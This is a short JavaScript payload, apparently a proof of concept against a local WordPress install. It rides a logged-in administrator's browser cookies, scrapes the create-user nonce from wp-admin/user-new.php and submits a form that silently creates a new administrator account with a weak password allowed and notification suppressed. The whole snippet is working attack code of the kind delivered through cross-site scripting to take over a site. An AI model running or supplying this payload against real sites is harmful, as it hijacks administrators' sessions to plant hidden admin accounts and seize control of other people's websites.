async function getCreateUserNonce() {
  const pageRes = await fetch("http://127.0.0.1/wordpress/wp-admin/user-new.php", {
    credentials: "include"  // uses browser's existing cookies automatically
  });

  const html = await pageRes.text();
  const match = html.match(/id="_wpnonce_create-user"\s+value="([^"]+)"/);
  return match ? match[1] : null;
}

async function createAdminUser(username, email, password) {
  const nonce = await getCreateUserNonce();
  if (!nonce) {
    console.error("Could not extract nonce");
    return;
  }

  const response = await fetch("http://127.0.0.1/wordpress/wp-admin/user-new.php", {
    method: "POST",
    credentials: "include",  // uses browser's existing cookies
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "Referer": "http://127.0.0.1/wordpress/wp-admin/user-new.php"
    },
    body: new URLSearchParams({
      action: "createuser",
      "_wpnonce_create-user": nonce,
      "_wp_http_referer": "/wordpress/wp-admin/user-new.php",
      user_login: username,
      email: email,
      first_name: "",
      last_name: "",
      url: "",
      pass1: password,
      pass2: password,
      pw_weak: "on",
      send_user_notification: "0",
      role: "administrator",
      createuser: "Add User"
    }).toString()
  });

  const result = await response.text();
  if (result.includes("user-new.php?update=add")) {
    console.log("User created successfully!");
  } else {
    console.log("Check response:", result.substring(0, 500));
  }
}

// Run it
createAdminUser("newadmin", "newadmin@example.com", "StrongPass123!");
